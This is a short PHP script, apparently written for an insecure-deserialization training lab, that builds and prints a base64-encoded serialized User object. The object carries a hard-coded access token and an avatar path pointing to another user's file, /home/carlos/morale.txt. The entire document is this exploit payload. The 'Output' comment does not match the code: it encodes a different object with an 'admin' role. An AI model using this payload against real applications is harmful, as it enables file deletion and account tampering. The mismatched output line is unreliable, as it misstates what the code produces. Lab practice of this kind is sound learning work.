<?php
class User {
    public $username = "wiener";
    public $access_token = "kh89449kqt8bpqjgx0zmgvki83x8y4y6";
    public $avatar_link = "/home/carlos/morale.txt";
}

$payload = base64_encode(serialize(new User()));
echo $payload;
// Output: Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjg6ImF0dGFja2VyIjtzOjQ6InJvbGUiO3M6NToiYWRtaW4iO3M6MTA6ImlzTG9nZ2VkSW4iO2I6MDt9
?>